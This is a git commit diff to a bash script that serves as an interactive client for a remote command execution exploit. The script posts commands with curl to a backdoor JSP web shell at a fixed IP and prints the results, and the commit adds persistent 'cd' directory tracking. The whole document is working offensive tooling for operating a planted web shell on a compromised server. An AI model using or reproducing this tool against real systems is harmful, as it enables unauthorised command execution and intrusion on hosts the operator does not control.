29c9630ad95e7bfcf0fe0a578aa81fc754d691f9
cyhfvg <code.guangzhou.zhang@outlook.com>
2022-11-25 12:09:44 +0800

    feat(`example`): `rce` example     add cd cmd support

--- example/rce_remote_command_execute.sh
+++ example/rce_remote_command_execute.sh
@@ -1,4 +1,4 @@
-#!/usr/bin/env bash
+#!/usr/bin/env -S bash -x
 
 :<<!
 auth: @cyhfvg https://github.com/cyhfvg
@@ -7,18 +7,39 @@ date: 2022/10/29
 Bash-invoker example script for RCE(Remote command execute) exploit.
 !
 
+prompt_opt=">"
+cur_path=""
+cd_cmd=""
+
 echo -e "input command.\nExample:\n>whoami\n"
-echo -n ">"
+echo -n "${prompt_opt}"
 
 while read cmd
 do
     printf "\033[32m${cmd}\033[0m\n";
 
+    if echo "${cmd}" | grep -qP 'cd \S+'; then
+        tmp_path="$(echo "${cmd}" | grep -oP '(?<=cd\s).+')"
+        if [ "${tmp_path:0:1}" = "/" ]; then
+            cur_path="${tmp_path}"
+        elif [ "${tmp_path:0:2}" = ".." ]; then
+            cur_path="${cur_path%/*}"
+        else
+            cur_path="${cur_path}/${tmp_path}"
+        fi
+
+        cur_path="$(echo ${cur_path} | sed -e 's#/\+#/#g;s#/$##g')"
+
+        cd_cmd="cd ${cur_path}/ &&"
+        echo -n "${cur_path}${prompt_opt}"
+        continue
+    fi
+
     # FIXME: change to correct command
     # urlencode get param
-    content=$(curl -s --data-urlencode cmd="${cmd}" "http://10.11.1.209:8080/backdoor/cmd.jsp" | sed -ne '/<pre>/,/<\/pre>/p' | sed -e '1d;$d')
+    content=$(curl -s --data-urlencode cmd="${cd_cmd} ${cmd}" "http://10.11.1.209:8080/backdoor/cmd.jsp" | sed -ne '/<pre>/,/<\/pre>/p' | sed -e '1d;$d')
 
     printf "\033[33m%s\033[0m\n" "${content}"
 
-    echo -n ">"
+    echo -n "${cur_path}${prompt_opt}"
 done
